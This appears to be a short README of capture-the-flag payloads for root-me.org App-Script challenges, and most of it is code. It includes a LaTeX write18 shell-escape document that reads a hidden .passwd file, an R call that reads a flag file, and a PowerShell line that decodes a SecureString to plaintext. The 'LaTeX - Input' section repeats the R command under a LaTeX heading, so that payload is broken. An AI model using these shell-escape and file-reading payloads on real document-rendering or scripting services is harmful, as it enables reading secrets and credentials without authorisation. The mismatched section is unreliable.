# root-me.org-payloads

## What is it ?

Some [root-me.org](https://www.root-me.org/) payloads

## R: Code Execution
[R Code Execution challenge](https://www.root-me.org/en/Challenges/App-Script/R-Code-Execution)

### Payload 
```R
read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
```

## LaTeX - Input
[LaTeX - Input challenge](https://www.root-me.org/fr/Challenges/App-Script/LaTeX-Input)

### Payload 
```LaTex
read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
```

## LaTeX - Command execution
[LaTeX - Command execution challenge](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

### Payload
```LaTex
catcode `\_=12
\documentclass{article}
\begin{document}
\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/buffer.tmp}
\input{/tmp/buffer.tmp}
\end{document}
```

## Powershell - SecureString
[PowerShell - SecureString challenge](https://www.root-me.org/fr/Challenges/App-Script/Powershell-SecureString)

### Payload
```Powershell
([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.Int
eropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
```
